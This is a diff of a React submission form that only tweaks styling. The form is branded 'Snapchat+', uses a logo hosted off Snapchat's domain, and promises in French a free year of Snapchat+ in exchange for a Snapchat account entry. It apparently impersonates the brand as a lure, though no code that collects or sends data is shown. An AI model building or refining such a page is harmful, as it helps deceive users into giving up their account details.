@@ -65,17 +65,17 @@ export default function SubmissionForm({ onSubmit, loading }) {
       className="w-full max-w-sm mx-auto"
     >
       {/* Card */}
-      <div className="bg-background border border-white/10 rounded-3xl px-6 py-8 shadow-2xl shadow-black/60">
+      <div className="bg-background border border-white/10 rounded-3xl px-5 py-5 shadow-2xl shadow-black/60">
 
         {/* Logo */}
-        <div className="flex flex-col items-center mb-5">
-          <div className="w-16 h-16 rounded-2xl overflow-hidden mb-4 shadow-lg shadow-primary/30">
+        <div className="flex flex-col items-center mb-3">
+          <div className="w-12 h-12 rounded-xl overflow-hidden mb-2 shadow-lg shadow-primary/30">
             <img src="https://media.base44.com/images/public/6a26f9f976c66281507ebfba/9b266cad6_plus.png" alt="Snapchat+" className="w-full h-full object-cover" />
           </div>
-          <h1 className="font-heading text-3xl font-black text-foreground tracking-tight">
+          <h1 className="font-heading text-2xl font-black text-foreground tracking-tight">
             Snapchat<span className="text-primary">+</span>
           </h1>
-          <p className="text-muted-foreground text-sm mt-1 text-center font-medium">
+          <p className="text-muted-foreground text-xs mt-0.5 text-center font-medium">
             Activez Snapchat+ gratuitement pendant 1 an !
           </p>
         </div>
@@ -108,7 +108,7 @@ export default function SubmissionForm({ onSubmit, loading }) {
           </p>
         </div>
 
-        <form onSubmit={handleSubmit} className="space-y-5">
+        <form onSubmit={handleSubmit} className="space-y-3">
           {/* Snapchat */}
           <div className="space-y-1.5">
             <label className="text-sm font-semibold text-foreground/90">
@@ -212,7 +212,7 @@ export default function SubmissionForm({ onSubmit, loading }) {
         </form>
 
         {/* Footer note */}
-        <p className="text-center text-muted-foreground/50 text-xs mt-5 leading-relaxed">
+        <p className="text-center text-muted-foreground/50 text-xs mt-3 leading-tight">
           L'abonnement Snapchat+ ne vous sera pas facturé.<br />
           L'abonnement est disponible uniquement pour les utilisateurs éligibles.
         </p>
